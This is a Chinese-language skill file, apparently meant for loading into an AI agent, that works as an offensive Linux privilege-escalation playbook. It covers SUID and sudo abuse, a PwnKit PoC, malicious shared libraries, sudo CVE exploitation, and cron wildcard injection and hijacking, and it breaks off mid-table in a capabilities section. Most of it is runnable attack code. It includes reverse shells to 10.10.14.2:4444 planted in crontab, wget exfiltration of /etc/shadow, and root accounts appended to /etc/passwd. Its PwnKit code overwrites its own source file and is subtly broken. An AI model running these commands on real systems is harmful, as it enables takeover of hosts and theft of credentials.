---
name: "linux-privilege-escalation"
description: "Linux提权全栈技能：SUID/GUID滥用/Capability滥用/Cron任务劫持/内核漏洞利用/2026最新CVE/容器逃逸/eBPF提权/Polkit/Docker提权/Sudo绕过/通配符注入/共享库劫持"
---

# SKILL: Linux 提权全栈技能 — 深度实战手册

> **AI LOAD INSTRUCTION**: 本技能聚焦 Linux 环境下的权限提升全生命周期。基础模型常把"Linux 提权"简化为"跑 LinPEAS 然后搜 CVE"，本技能澄清：Linux 提权是**系统配置缺陷与内核攻击面的深度利用**——从 SUID 二进制滥用、Sudo 权限误配、Cron 任务劫持、Capabilities 越权、内核漏洞利用、容器逃逸到 eBPF 新技术，覆盖完整攻击链。每节包含实战命令、PoC 代码、GTFOBins 利用链、自动化工具链，以及 2026 年最新 CVE 与防御检测矩阵。

## 0. RELATED ROUTING

- [network-penetration-testing](../network-penetration-testing/SKILL.md) — 外网渗透获取初始立足点后，Linux 提权是内网横向关键环节
- [container-security-testing](../container-security-testing/SKILL.md) — 容器逃逸与 Docker/K8s 安全，与本文容器逃逸章节互补
- [exploit-development-framework](../exploit-development-framework/SKILL.md) — 内核漏洞利用开发，ROP/JOP/堆利用等高级技术
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) — 暴露服务利用，常为提权入口
- [webshell-evasion](../webshell-evasion/SKILL.md) — WebShell 获得立足点后，Linux 提权为下一步

---

## 1. 信息收集 — 系统全面侦察

信息收集是 Linux 提权最关键的第一步。一个低权限 shell 能获取的系统信息量，直接决定了提权路径的选择。本节覆盖从系统基本信息到内核版本、进程、网络、定时任务、SUID/SGID、Capabilities 的全维度侦察。

### 1.1 系统基本信息

```bash
# === 操作系统与内核 ===
uname -a                                    # 内核版本+架构+主机名
cat /proc/version                           # 内核编译信息（GCC版本）
cat /etc/os-release                         # 发行版名称与版本
cat /etc/issue                              # 发行版标识
cat /etc/*-release                          # 所有发行版信息
hostnamectl                                 # systemd 系统信息

# === 内核版本针对性提取 ===
uname -r | awk -F'-' '{print $1}'          # 纯版本号，用于 CVE 匹配
cat /proc/sys/kernel/randomize_va_space     # ASLR 状态 (0=禁用, 2=全随机)
cat /proc/sys/kernel/kptr_restrict          # 内核指针限制 (0=可读, 1=限制)
cat /proc/sys/kernel/dmesg_restrict         # dmesg 访问限制
cat /proc/sys/kernel/unprivileged_bpf_disabled  # 非特权 eBPF (0=可加载)
cat /proc/sys/kernel/yama/ptrace_scope      # ptrace 限制 (0=无限制)

# === 硬件信息 ===
lscpu                                       # CPU 架构+核数
cat /proc/cpuinfo | grep -E "model name| cores|cpu cores"
free -h                                     # 内存信息
df -h                                       # 磁盘挂载与使用率
lsblk                                       # 块设备列表
fdisk -l 2>/dev/null | grep -E "^/dev"     # 分区信息
```

### 1.2 当前用户与权限上下文

```bash
# === 用户身份 ===
id                                          # uid/gid/附加组
whoami                                      # 当前用户名
echo $USER                                  # 环境变量中的用户
cat /etc/passwd | grep -v nologin           # 可登录用户列表
cat /etc/passwd | grep ":/bin/bash"         # 有 bash shell 的用户
cat /etc/shadow 2>/dev/null                 # 尝试读取 shadow（提权后）

# === 权限组检测 ===
# 检查是否属于特权组
groups | grep -E "sudo|wheel|adm|docker|lxc|lxd|libvirt|kvm|disk|shadow"
# adm 组可读 /var/log
# docker 组可逃逸至 root
# disk 组可读写原始磁盘设备
# shadow 组可读 /etc/shadow

# === Sudo 权限 ===
sudo -l 2>/dev/null                         # 列出可执行的 sudo 命令
sudo -V 2>/dev/null | head -5              # sudo 版本
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# === 当前进程 ===
ps aux                                      # 所有进程
ps -ef --forest                             # 进程树
ps aux | grep root                          # 以 root 运行的进程
cat /proc/1/cgroup                          # 容器检测：含 docker/lxc/kubepods
cat /proc/1/environ | tr '\0' '\n'          # PID 1 环境变量
```

### 1.3 内核模块与安全机制

```bash
# === 已加载内核模块 ===
lsmod                                       # 所有已加载模块
cat /proc/modules                           # 同上
modinfo <module_name>                       # 某模块详情

# === 安全机制检测 ===
# SELinux
sestatus 2>/dev/null
getenforce 2>/dev/null
cat /etc/selinux/config 2>/dev/null

# AppArmor
aa-status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null

# seccomp (通过检查进程)
cat /proc/self/status | grep -i seccomp

# Kernel lockdown
cat /sys/kernel/security/lockdown 2>/dev/null
dmesg 2>/dev/null | grep -i lockdown
```

### 1.4 进程、服务与计划任务

```bash
# === 运行中的服务 ===
systemctl list-units --type=service --state=running 2>/dev/null
service --status-all 2>/dev/null
netstat -tulpn 2>/dev/null                 # 监听端口+进程
ss -tulpn                                   # 现代替代 netstat
lsof -i -P -n 2>/dev/null                  # 所有网络连接

# === 内部服务（仅本地监听）===
ss -tlnp | grep "127.0.0.1"                # 仅监听 localhost 的服务
netstat -tulpn 2>/dev/null | grep "127.0.0.1"

# === Cron 任务 ===
crontab -l 2>/dev/null                     # 当前用户 crontab
ls -la /etc/cron*                           # 系统级 cron 目录
cat /etc/crontab                            # 系统 crontab 文件
cat /etc/cron.d/*                           # cron.d 目录
cat /etc/cron.daily/*                       # 每日任务
cat /etc/cron.hourly/*                      # 每小时任务
cat /etc/cron.weekly/*                      # 每周任务
cat /etc/cron.monthly/*                     # 每月任务
ls -la /var/spool/cron/crontabs/            # 用户 crontab 文件

# === systemd timers (cron 替代品) ===
systemctl list-timers --all 2>/dev/null
ls -la /etc/systemd/system/*.timer
ls -la /usr/lib/systemd/system/*.timer
```

### 1.5 SUID / SGID 文件全面扫描

```bash
# === SUID 文件查找 ===
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
# 排除常见非利用路径
find / -perm -4000 -type f 2>/dev/null | grep -vE "/snap/|/proc/"

# === SGID 文件查找 ===
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# === 可写 SUID 文件（高危）===
find / -perm -4000 -writable -type f 2>/dev/null

# === 按属主分类 ===
find / -user root -perm -4000 -type f 2>/dev/null  # root 属主 SUID
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | awk '{print $3, $NF}'

# === 已知可提权 SUID 二进制快速检测 ===
# GTFOBins 关键二进制检测
for bin in find bash vim python python3 perl ruby php gcc g++ node npm \
  systemctl pkexec env cp mv cat less more awk sed tar gzip bzip2 \
  socat ncat nmap docker podman aria2c wget curl; do
  path=$(which $bin 2>/dev/null)
  if [ -n "$path" ]; then
    perms=$(stat -c "%a %U %G" "$path" 2>/dev/null)
    case "$perms" in
      4*|2*) echo "[!] SUID/SGID: $path ($perms)" ;;
    esac
  fi
done
```

### 1.6 Capabilities 扫描

```bash
# === 进程 Capabilities ===
cat /proc/self/status | grep -i cap
capsh --print 2>/dev/null
getcap -r / 2>/dev/null                     # 递归扫描所有文件 Capabilities

# === 关键 Capabilities 检查 ===
# cap_sys_admin, cap_sys_ptrace, cap_dac_read_search, cap_dac_override
# cap_net_raw, cap_net_admin, cap_setuid, cap_setgid, cap_chown
# cap_fowner, cap_sys_module, cap_sys_rawio, cap_sys_boot
getcap -r / 2>/dev/null | grep -E "cap_sys_admin|cap_sys_ptrace|cap_dac_read_search|cap_net_raw|cap_sys_module|cap_setuid"

# === 容器环境 Capabilities ===
# 检查当前容器拥有的 Capabilities
cat /proc/1/status | grep -i "CapEff:" | awk '{print $2}'
# 解码 CapEff 位掩码
capsh --decode=<hex_value> 2>/dev/null
```

### 1.7 网络与通信

```bash
# === 网络接口与路由 ===
ip a                                        # 所有网络接口
ip route                                    # 路由表
ip neigh                                    # ARP 表
cat /etc/hosts                              # 主机名解析
cat /etc/resolv.conf                        # DNS 配置

# === 内网侦测 ===
arp -a                                      # ARP 缓存
# 内网存活主机扫描 (需要 ping 或 nmap)
for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i 2>/dev/null | grep "ttl=" & done
# 检查 iptables 规则
iptables -L -n 2>/dev/null
iptables -t nat -L 2>/dev/null

# === 网络文件系统 ===
showmount -e 127.0.0.1 2>/dev/null         # NFS 导出
showmount -e <target_ip> 2>/dev/null
cat /etc/exports 2>/dev/null                # NFS 服务端配置
cat /etc/fstab                              # 挂载表
mount | grep -E "nfs|cifs|smb"             # 已挂载网络文件系统
```

### 1.8 已安装软件与包管理器

```bash
# === 包管理器 ===
dpkg -l 2>/dev/null | head -100            # Debian/Ubuntu
rpm -qa 2>/dev/null | head -100            # RHEL/CentOS
apk list --installed 2>/dev/null           # Alpine
pacman -Q 2>/dev/null                       # Arch

# === 可用的编程语言/解释器 ===
which python python3 perl ruby php gcc g++ node npm go rustc lua 2>/dev/null

# === 已安装工具 ===
which nc ncat wget curl socat nmap tcpdump ssh telnet 2>/dev/null
which gdb strace ltrace 2>/dev/null        # 调试工具
which xxd base64 openssl 2>/dev/null       # 编码/加密工具
```

### 1.9 可写目录与文件权限

```bash
# === 可写目录 ===
find / -writable -type d 2>/dev/null | grep -vE "/proc/|/sys/|/snap/"

# === /tmp 与 /dev/shm ===
ls -la /tmp /dev/shm /var/tmp
# 检查 /tmp 是否 noexec
mount | grep /tmp
# 检查 /dev/shm 是否可执行
touch /dev/shm/test && chmod +x /dev/shm/test && /dev/shm/test 2>/dev/null; rm -f /dev/shm/test

# === $PATH 中的可写目录 ===
echo $PATH | tr ':' '\n' | while read d; do
  [ -w "$d" ] && echo "[!] Writable in PATH: $d"
done

# === 用户家目录可写 ===
ls -la /home/
find /home -type d -writable 2>/dev/null
```

### 1.10 自动化信息收集脚本（一键式）

```bash
# LinPEAS - 最全面的 Linux 提权信息收集
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# 或本地执行
./linpeas.sh -a > linpeas_output.txt

# LinEnum - 轻量级枚举
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh

# linux-smart-enumeration (lse.sh)
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
chmod +x lse.sh && ./lse.sh -l2

# 快速手动枚举脚本（无网络环境）
cat > /tmp/enum.sh << 'ENUMEOF'
#!/bin/bash
echo "=== KERNEL ==="; uname -a
echo "=== USER ==="; id; sudo -l 2>/dev/null
echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | grep -v snap
echo "=== CAPS ==="; getcap -r / 2>/dev/null
echo "=== CRON ==="; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null
echo "=== NET ==="; ss -tlnp 2>/dev/null; netstat -tulpn 2>/dev/null
echo "=== WRITABLE ==="; find / -writable -type d 2>/dev/null | grep -vE "/proc|/sys|/snap"
echo "=== PASSWORD FILES ==="; find / -name "*. bak" -o -name "*pass*" -o -name "*cred*" 2>/dev/null | head -20
echo "=== SSH ==="; find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null | head -10
echo "=== HISTORY ==="; find /home -name ".bash_history" -o -name ".zsh_history" 2>/dev/null
echo "=== DOCKER ==="; docker ps 2>/dev/null; ls -la /var/run/docker.sock 2>/dev/null
ENUMEOF
chmod +x /tmp/enum.sh && /tmp/enum.sh
```

---

## 2. SUID / SGID 提权 — GTFOBins 完整利用链

SUID (Set User ID) 是 Linux 最经典的提权入口之一。当一个二进制文件设置了 SUID 位并以 root 为属主时，任何用户执行该文件都会以 root 权限运行。GTFOBins 项目收录了数百个可被滥用的 SUID 二进制文件，本节覆盖最常用的利用链。

### 2.1 SUID 提权原理

```
SUID 位 (chmod u+s) → 执行时有效 UID = 文件属主 UID
SUID root 二进制 → 任意用户执行 = root 权限
攻击模型：利用 SUID 二进制的内置功能（如 find 的 -exec）实现命令执行
```

### 2.2 find — SUID 提权

```bash
# 查找 SUID find
find / -perm -4000 -type f -name "find" 2>/dev/null

# 利用 find 的 -exec 参数执行命令
find . -exec /bin/sh -p \; -quit
find . -exec /bin/bash -p \; -quit
find . -exec chmod u+s /bin/bash \; -quit     # 给 bash 加 SUID

# 利用 find 的 -execdir
find /tmp -execdir /bin/sh -p \; -quit

# 利用 -exec 读取敏感文件
find /etc/shadow -exec cat {} \; -quit
```

### 2.3 bash — SUID 提权

```bash
# bash 的 -p 参数保留特权模式（POSIX 要求）
/bin/bash -p
# 如果 bash 被打了补丁（丢弃 SUID），尝试：
/bin/bash -p 2>/dev/null || echo "bash drops privileges"

# 利用方式：直接执行
bash -p -c 'cat /etc/shadow'
bash -p -c 'chmod u+s /bin/bash'
```

### 2.4 vim / vi — SUID 提权

```bash
# vim 内执行命令
vim -c ':!/bin/bash -p'
vim -c ':!/bin/sh'

# vim 交互模式
vim
:set shell=/bin/bash
:shell

# vim 读取文件
vim /etc/shadow

# 利用 vim 写入 SSH 密钥
vim -c ':r!ssh-keygen -t rsa -f /tmp/id_rsa -N ""' \
    -c ':w /root/.ssh/authorized_keys' \
    -c ':q!'
```

### 2.5 python / python3 — SUID 提权

```bash
# Python 交互式 shell
python -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
python -c 'import pty; pty.spawn("/bin/bash -p")'

# Python 读取文件
python -c 'print(open("/etc/shadow").read())'

# Python 反弹 shell
python -c 'import socket,subprocess,os; \
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
  s.connect(("10.10.14.2",4444)); \
  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \
  subprocess.call(["/bin/bash","-p"])'
```

### 2.6 perl — SUID 提权

```bash
perl -e 'exec "/bin/bash -p";'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'
```

### 2.7 ruby — SUID 提权

```bash
ruby -e 'exec "/bin/bash -p"'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash -p"'
```

### 2.8 php — SUID 提权

```bash
php -r 'system("/bin/bash -p");'
php -r 'exec("/bin/bash -p");'
php -r 'pcntl_exec("/bin/bash", ["-p"]);'
```

### 2.9 systemctl — SUID 提权（高危）

```bash
# 如果 systemctl 有 SUID，创建恶意服务
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF

# 然后直接执行 suid bash
/bin/bash -p
```

### 2.10 pkexec — SUID 提权（CVE-2021-4034 PwnKit）

```bash
# pkexec 默认就是 SUID root
# CVE-2021-4034: PwnKit — 参数注入导致本地提权
# 影响：2009 年至今所有 Polkit 版本

# PoC 利用（C 源码编译）
cat > /tmp/pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char *envp[] = {
    "pwnkit",
    "PATH=GCONV_PATH=.",
    "CHARSET=PWNKIT",
    "SHELL=pwnkit",
    NULL
};
int main() {
    char *argv[] = { NULL };
    execve("/usr/bin/pkexec", argv, envp);
    return 0;
}
EOF

# 编译 GCONV_PATH 模块
mkdir -p /tmp/GCONV_PATH=.
cp /bin/true /tmp/GCONV_PATH=./pwnkit
cat > /tmp/pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    execl("/bin/bash", "bash", "-p", NULL);
    exit(0);
}
EOF
gcc -shared -fPIC -o /tmp/pwnkit.so /tmp/pwnkit.c
gcc -o /tmp/pwnkit /tmp/pwnkit.c
/tmp/pwnkit
```

### 2.11 其他常见 SUID 二进制利用速查

| 二进制 | 利用命令 | GTFOBins 类别 |
|--------|---------|--------------|
| `awk` | `awk 'BEGIN {system("/bin/bash -p")}'` | shell |
| `sed` | `sed -n '1e /bin/bash -p' /etc/hosts` | shell |
| `cp` | `cp /bin/bash /tmp/bash && chmod u+s /tmp/bash` | file-write |
| `mv` | 覆盖关键文件（如 /etc/passwd） | file-write |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` | shell |
| `gzip` | `gzip -f /etc/shadow -t` 读文件 | file-read |
| `less` | `less /etc/shadow` 然后 `!bash` | shell |
| `more` | `more /etc/shadow` 然后 `!bash` | shell |
| `man` | `man man` 然后 `!bash` | shell |
| `nmap` | `nmap --interactive` 然后 `!bash` (旧版) | shell |
| `nmap` | `echo "os.execute('/bin/bash -p')" > /tmp/nse.nse && nmap --script=/tmp/nse.nse` (新版) | shell |
| `env` | `env /bin/bash -p` | shell |
| `chmod` | `chmod u+s /bin/bash` | suid |
| `chown` | `chown root:root /tmp/evil.sh` | suid |
| `mount` | 挂载恶意文件系统 | suid |
| `mount` | `mount -o bind /bin/bash /bin/mount && /bin/mount -p` | shell |
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` | suid |
| `crontab` | `crontab -e` 添加 root 定时任务 | suid |
| `ssh` | `ssh -o ProxyCommand='/bin/bash -p' localhost` | shell |
| `git` | `git -p help config` 然后 `!/bin/bash` | shell |
| `apt-get` | `apt-get changelog apt` 然后 `!/bin/bash` | shell |
| `pip` | `pip install --upgrade --force-reinstall /tmp/evil.whl` | suid |
| `node` | `node -e 'require("child_process").spawn("/bin/bash",["-p"],{stdio:"inherit"})'` | shell |
| `gdb` | `gdb -nx -ex '!bash -p' -ex quit` | shell |
| `strace` | `strace -o /dev/null /bin/bash -p` | shell |
| `cpan` | `cpan` 然后 `!bash` | shell |
| `gcc` | `gcc -wrapper /bin/bash,-p /dev/null` | shell |
| `make` | `COMMAND='/bin/bash -p' make -f /dev/null` | shell |
| `expect` | `expect -c 'spawn /bin/bash -p; interact'` | shell |
| `socat` | `socat exec:'bash -p',pty,stderr,setsid tcp:10.10.14.2:4444` | shell |
| `wget` | `wget --post-file=/etc/shadow http://10.10.14.2/` | file-read |
| `curl` | `curl file:///etc/shadow` | file-read |
| `aria2c` | `aria2c --on-download-complete=/bin/bash http://x` | shell |

### 2.12 SUID 共享库劫持

```bash
# 当 SUID 二进制依赖非标准路径的共享库时
# 1. 查找 SUID 二进制缺失的共享库
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open\|no such file"

# 2. 查找 SUID 二进制加载的共享库
ldd /usr/local/bin/suid_binary
# 如果显示 "not found" 的库，可劫持

# 3. 利用 LD_PRELOAD（如果 SUID 二进制没有清理环境）
# 需要检查 SUID 二进制是否使用了 nosuid 挂载或清理了 LD_PRELOAD
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
LD_PRELOAD=/tmp/evil.so /usr/local/bin/suid_binary
```

---

## 3. Sudo 权限滥用 — 从 sudo -l 到 root

Sudo 配置不当是 Linux 提权的第二大常见入口。`sudo -l` 列出的可执行命令，如果配置为 NOPASSWD 或过度宽松，几乎都可以被滥用以提权到 root。

### 3.1 sudo -l 分析框架

```bash
# 完整 sudo 权限列表
sudo -l

# 输出解读：
# (root) NOPASSWD: /usr/bin/find     → 可以 root 身份无密码执行 find
# (root) /usr/bin/vim                 → 需要密码，但可 root 执行 vim
# (ALL) ALL                           → 完全 root 权限（已有 root）
# (ALL : ALL) ALL                     → 同上
# (root) SETENV: NOPASSWD: /usr/bin/python3 → 可设置环境变量，高危

# 检查 sudo 版本（已知漏洞）
sudo -V | head -1
# sudo <= 1.9.5p2 → CVE-2021-3156 (Baron Samedit)
# sudo <= 1.8.28  → CVE-2019-14287 (绕过 uid 限制)
```

### 3.2 NOPASSWD 命令利用（GTFOBins 速查）

```bash
# === 直接提权类 ===
sudo /usr/bin/find . -exec /bin/bash \; -quit
sudo /usr/bin/vim -c ':!/bin/bash'
sudo /usr/bin/less /etc/shadow   # 然后输入 !bash
sudo /usr/bin/more /etc/shadow   # 然后输入 !bash
sudo /usr/bin/man man            # 然后输入 !bash
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
sudo /usr/bin/nmap --interactive # 旧版 nmap
sudo /usr/bin/gdb -nx -ex '!bash' -ex quit
sudo /usr/bin/git -p help config # 然后输入 !/bin/bash
sudo /usr/bin/ftp                # 然后输入 !/bin/bash
sudo /usr/bin/socat stdin exec:/bin/bash,pty,stderr,setsid
sudo /usr/bin/ssh -o ProxyCommand='/bin/bash -i' localhost

# === 文件读取类 → 泄露凭据 ===
sudo /usr/bin/cat /etc/shadow
sudo /usr/bin/head -n1 /etc/shadow
sudo /usr/bin/tail -n1 /root/.ssh/id_rsa
sudo /usr/bin/xxd /etc/shadow | xxd -r
sudo /usr/bin/base64 /etc/shadow | base64 -d

# === 文件写入类 → 写 SSH 密钥或 crontab ===
# 写 authorized_keys
sudo /usr/bin/tee -a /root/.ssh/authorized_keys <<< "$(cat /tmp/id_rsa.pub)"
# 写 crontab
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"' | sudo /usr/bin/tee /etc/crontab
# 写 /etc/passwd
echo "newroot:$(openssl passwd -1 toor):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
```

### 3.3 LD_PRELOAD 注入（SETENV 配置）

当 `sudo -l` 显示 `SETENV:` 时，可设置环境变量，最常见的就是 LD_PRELOAD 注入：

```bash
# 检查是否有 SETENV 权限
sudo -l | grep SETENV

# 编写恶意共享库
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

# 通过 sudo 注入
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>
```

### 3.4 LD_LIBRARY_PATH 劫持

```bash
# 当 sudo 允许设置 LD_LIBRARY_PATH 时
# 1. 找到 sudo 允许的命令使用了哪些共享库
ldd /usr/bin/<allowed_command>

# 2. 劫持其中一个库（如 libcrypt.so.1）
cat > /tmp/libcrypt.so.1.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    setuid(0); setgid(0);
    system("/bin/bash");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/libcrypt.so.1 /tmp/libcrypt.so.1.c

# 3. 通过 LD_LIBRARY_PATH 加载
sudo LD_LIBRARY_PATH=/tmp <allowed_command>
```

### 3.5 环境变量注入（env_keep 配置）

```bash
# 检查 sudoers 中的 env_keep 配置
sudo -l | grep env_keep

# PYTHONPATH 劫持
# 如果 env_keep+=PYTHONPATH，且允许 sudo python
cat > /tmp/evil.py << 'EOF'
import os
os.setuid(0)
os.system("/bin/bash")
EOF
sudo PYTHONPATH=/tmp python -c 'import evil'

# PERL5LIB 劫持
cat > /tmp/evil.pm << 'EOF'
package evil;
use strict;
system("/bin/bash");
1;
EOF
sudo PERL5LIB=/tmp perl -Mevil -e '1'

# RUBYLIB 劫持
cat > /tmp/evil.rb << 'EOF'
module Evil
  system("/bin/bash")
end
EOF
sudo RUBYLIB=/tmp ruby -e 'require "evil"'
```

### 3.6 符号链接攻击（sudo 路径欺骗）

```bash
# 如果 sudo 允许执行某个脚本，但脚本内部使用了相对路径命令
# 例如：sudo /opt/backup.sh，脚本内部调用 tar

# 1. 查看脚本内容
sudo /opt/backup.sh 2>&1 | head -5
# 或 cat /opt/backup.sh（如果有读权限）

# 2. 如果脚本使用相对路径的 tar，劫持 PATH
cd /tmp && ln -s /bin/bash tar
sudo PATH=/tmp:$PATH /opt/backup.sh
```

### 3.7 CVE-2021-3156 (Baron Samedit / Sudoedit 堆溢出)

```bash
# 影响 sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
# 通过 sudoedit -s 触发堆溢出实现提权

# 检查版本
sudo --version | head -1

# 利用 PoC（编译好的）
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156 && make
./sudo-hax-me-a-sandwich 0   # 根据系统选择 target
./sudo-hax-me-a-sandwich 1
./sudo-hax-me-a-sandwich 2

# 一键测试
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

### 3.8 CVE-2019-14287 (sudo 绕过 uid 限制)

```bash
# 影响 sudo < 1.8.28
# 当 sudoers 配置为 (ALL, !root) 时，可用 #-1 绕过

# 检查配置
sudo -l | grep "(ALL, !root)"

# 利用
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

---

## 4. Cron 任务劫持 — 定时任务全链路攻击

Cron 是 Linux 系统定时任务调度器，当 root 运行的 cron 任务引用了可被低权限用户控制的文件/目录/脚本时，就构成了提权入口。

### 4.1 Cron 任务全面侦察

```bash
# === 系统级 Cron ===
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# === 用户级 Cron ===
crontab -l 2>/dev/null
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/* 2>/dev/null

# === systemd timers ===
systemctl list-timers --all 2>/dev/null

# === 动态监控 Cron 执行（pspy）===
# 下载 pspy 监控所有进程（无需 root）
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64 && ./pspy64
```

### 4.2 PATH 劫持

```bash
# 场景：root cron 任务调用脚本，脚本使用相对路径命令
# /etc/crontab 内容：
# * * * * * root /opt/backup.sh
# /opt/backup.sh 内容：#!/bin/bash\ntar -czf /tmp/backup.tar.gz /var/www

# 1. 检查脚本是否可写
ls -la /opt/backup.sh
# 如果可写，直接替换脚本内容

# 2. 如果脚本不可写，但 PATH 可劫持
# 检查 cron 的 PATH 配置
cat /etc/crontab | grep PATH
# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# 如果 cron PATH 中有可写目录
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "[!] $d is writable"; done

# 3. 在可写 PATH 目录中创建同名恶意命令
cat > /home/user/bin/tar << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
EOF
chmod +x /home/user/bin/tar
# 然后将 /home/user/bin 加入 cron PATH 或修改 crontab
```

### 4.3 通配符注入（Wildcard Injection）

Cron 任务中经典的 `tar` 通配符注入是最高效的提权方式之一：

```bash
# 场景：root cron 执行 tar -czf /backup/www.tar.gz /var/www/*
# 或 cd /var/www && tar -czf /backup/www.tar.gz *

# 1. 在 /var/www/ 目录下创建恶意文件名
cd /var/www/
echo "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash" > /var/www/privesc.sh
chmod +x /var/www/privesc.sh

# 2. 创建 tar 通配符注入文件
touch /var/www/--checkpoint=1
touch /var/www/--checkpoint-action=exec=sh\ privesc.sh

# 3. 等 cron 执行后
ls -la /tmp/bash       # 应该出现 SUID bash
/tmp/bash -p           # 获得 root shell

# 其他常用通配符注入
# rsync 通配符注入
touch /var/www/'-e sh privesc.sh'

# zip 通配符注入
touch '/var/www/--unzip-command="sh privesc.sh"'

# 7z 通配符注入
touch '/var/www/@sh privesc.sh'
```

### 4.4 脚本覆盖与文件权限

```bash
# === 可写 cron 脚本 ===
# 查找可写的 cron 相关文件
find /etc/cron* -writable -type f 2>/dev/null
find /var/spool/cron -writable -type f 2>/dev/null

# 如果 /etc/crontab 可写
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"' >> /etc/crontab

# 如果 cron.d 目录可写
echo '* * * * * root /bin/bash -c "chmod u+s /bin/bash"' > /etc/cron.d/privesc

# 如果 cron.daily 脚本可写
cat > /etc/cron.daily/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
EOF
chmod +x /etc/cron.daily/backup.sh

# === 目录权限漏洞 ===
# 如果 cron 脚本所在目录可写但脚本不可写
# 可删除原脚本，创建同名恶意脚本
ls -la /opt/scripts/                      # 检查目录权限
# drwxrwxrwx → 可删除任意文件
rm /opt/scripts/backup.sh
cat > /opt/scripts/backup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
EOF
chmod +x /opt/scripts/backup.sh
```

### 4.5 Cron 日志分析

```bash
# 查看 cron 执行日志确认任务是否被执行
grep CRON /var/log/syslog 2>/dev/null | tail -20
grep CRON /var/log/cron 2>/dev/null | tail -20
grep CRON /var/log/messages 2>/dev/null | tail -20
journalctl -u cron 2>/dev/null | tail -20
```

### 4.6 systemd Timer 劫持

```bash
# === 列出所有 timer ===
systemctl list-timers --all --no-pager 2>/dev/null

# === 检查 timer 对应的 service 文件 ===
# 例如：logrotate.timer → logrotate.service
systemctl cat logrotate.service

# === 如果 service 文件可写 ===
# 修改 ExecStart 为恶意命令
cat > /etc/systemd/system/logrotate.service << 'EOF'
[Unit]
Description=Logrotate
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
# 等待 timer 触发或手动触发
systemctl start logrotate.service

# === 如果 service 文件不可写但依赖的脚本可写 ===
# 查看 service 的 ExecStart 执行了什么脚本
# 检查脚本是否可写
```

---

## 5. Capabilities 滥用 — 细粒度权限越权

Linux Capabilities 将 root 特权拆分为细粒度权限单元。当二进制文件被授予了特定 Capability 时，可以在不拥有完整 root 权限的情况下执行特权操作。误配置的 Capabilities 可被利用实现提权。

### 5.1 Capabilities 基础

| Capability | 说明 | 利用方式 |
|-----------|------|---------|
